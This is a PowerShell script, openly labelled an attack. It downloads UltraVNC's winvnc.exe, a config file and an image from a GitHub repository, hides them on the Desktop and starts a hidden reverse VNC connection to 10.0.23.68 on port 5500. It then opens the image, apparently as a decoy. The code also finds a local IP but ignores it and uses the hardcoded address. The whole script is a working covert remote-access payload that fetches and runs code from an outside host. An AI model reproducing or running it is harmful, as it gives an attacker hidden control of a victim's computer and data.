# --- Configuration ---
$desktopPath = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::Desktop)

# --- Step 1: Download files to the TEMP folder ---
$tempIniPath = Join-Path -Path $env:TEMP -ChildPath "UltraVNC.ini"
$tempExePath = Join-Path -Path $env:TEMP -ChildPath "winvnc.exe"
$tempImgPath = Join-Path -Path $env:TEMP -ChildPath "hackerloi.jpg"

# Using your GitHub links
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/khaalidxaashi81-oss/my-files-/main/UltraVNC.ini" -OutFile $tempIniPath
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/khaalidxaashi81-oss/my-files-/main/winvnc.exe" -OutFile $tempExePath
Invoke-WebRequest -Uri "https://github.com/khaalidxaashi81-oss/my-files-/blob/main/Untitled.jpg?raw=true" -OutFile $tempImgPath

# --- Step 2: Move the files from TEMP to the Desktop ---
$desktopIniPath = Join-Path -Path $desktopPath -ChildPath "ultravnc.ini"
$desktopExePath = Join-Path -Path $desktopPath -ChildPath "winvnc.exe"
$desktopImgPath = Join-Path -Path $desktopPath -ChildPath "hackerloi.jpg"

Move-Item -Path $tempIniPath -Destination $desktopIniPath -Force
Move-Item -Path $tempExePath -Destination $desktopExePath -Force
Move-Item -Path $tempImgPath -Destination $desktopImgPath -Force

# --- Step 3: Hide the files on the Desktop ---
Set-ItemProperty -Path $desktopIniPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
Set-ItemProperty -Path $desktopExePath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
Set-ItemProperty -Path $desktopImgPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)

# --- Step 4: Find the local IP and Execute the attack ---
# Find the local IP address of the machine to connect back to
$localIP = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias "Ethernet*").IPAddress
if (-not $localIP) {
    $localIP = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias "Wi-Fi*").IPAddress
}

# Use the dynamically found local IP for the connection
$params = "-connect 10.0.23.68::5500"

try {
    Start-Process -FilePath $desktopExePath -ArgumentList $params -WindowStyle Hidden
} catch {
    Write-Error "Failed to start winvnc.exe: $_"
}

try {
    Start-Process $desktopImgPath
} catch {
    Write-Error "Failed to show image: $_"
}